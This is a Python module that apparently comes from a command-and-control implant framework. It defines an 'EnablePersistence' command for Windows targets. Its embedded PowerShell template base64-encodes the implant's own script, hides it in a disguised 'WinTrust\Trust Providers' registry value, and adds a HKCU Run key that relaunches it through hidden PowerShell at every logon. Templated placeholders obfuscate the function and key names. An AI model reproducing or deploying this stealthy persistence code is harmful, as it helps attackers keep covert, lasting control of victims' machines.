class EnablePersistence:
    type = "EP"
    args = None
    input = "enable_persistence"

    def process_implant_response(self, data, args):
        print(type(data.decode()))
        if data.decode() == "0":
            return f"Persistence already exists.", None
        else:
            return f"Enable persistence:\n{data.decode()}", None

    def implant_text(self):
        var = '''
$global:gr = $MyInvocation.MyCommand.ScriptBlock 
function {{ ron.obf_create_persistence }}(){
    $abc = "HKCU:/Software/Microsoft/Windows/CurrentVersion/Run/"
    $def = "HKCU:/Software/Microsoft/Windows/CurrentVersion/WinTrust/Trust Providers/"
    $key = Get-Item -LiteralPath $abc -ErrorAction SilentlyContinue
    $ec = [System.Convert]::ToBase64String([system.Text.Encoding]::utf8.getbytes($global:gr))
    $val = "powershell.exe -win hidden -NonI -c (icm -scriptblock ([scriptblock]::Create([System.Text.Encoding]::utf8.GetString([System.Convert]::FromBase64String((gp 'HKCU:\Software\Microsoft\Windows\CurrentVersion\WinTrust\Trust Providers\').State)))))"
    if ($key.Property -Like "{{ ron.obf_reg_key_name }}"){
        $global:tr = "0"
    } else {
        New-ItemProperty -path $abc -Name {{ ron.obf_reg_key_name }} -Value $val -PropertyType "String"
        New-ItemProperty -Path $def -Name State -Value $ec -PropertyType "String"
        $global:tr = "1"
    }
}'''
        return var
